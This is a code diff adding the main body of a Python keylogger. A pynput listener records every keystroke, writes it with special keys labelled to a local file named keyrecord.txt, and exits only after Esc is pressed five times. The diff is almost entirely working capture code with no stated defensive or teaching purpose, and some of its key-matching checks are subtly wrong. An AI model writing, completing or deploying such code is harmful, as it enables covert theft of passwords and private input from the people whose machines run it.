@@ -22,3 +22,28 @@ if count >= 1:
 
 def write_file(keys):
     with open("keyrecord.txt","a") as f:
+        for key in keys:
+            k=str(key).replace("'","")
+            if k.find("backspace") > 0:
+                f.write("Backspace_key ")
+            elif k.find("enter") > 0:
+                f.write('\n')
+            elif k.find("shift") > 0:
+                f.write("Shift_key ")
+            elif k.find("space") > 0:
+                f.write(" ")
+            elif k.find("caps_lock") >0 :
+                f.write("caps_Lock_key ")
+            elif k.find("Key"):
+                f.write(k)
+
+def on_release(key):
+    global exit
+    if key == Key.esc:
+        exit += 1
+        if exit == 5 :
+            return False
+
+exit = 0
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
